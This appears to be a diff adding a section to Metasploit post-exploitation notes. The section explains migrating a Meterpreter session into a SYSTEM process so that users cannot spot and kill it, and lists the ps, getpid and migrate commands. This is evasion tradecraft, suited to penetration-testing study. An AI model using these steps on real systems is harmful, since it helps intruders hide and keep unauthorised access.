@@ -74,3 +74,13 @@ msf6 > set SESSION 2
 msf6 > run
 
 ```
+
+#### Migrating Process
+> Sometime users may lookinto the process running on their system and attacker session can be terminated. So we can migrate our process to another having equal privilege.
+
+```
+ps     > list all process on system
+getpid > get the current shell pid
+ps -U SYSTEM
+migrate pid
+```
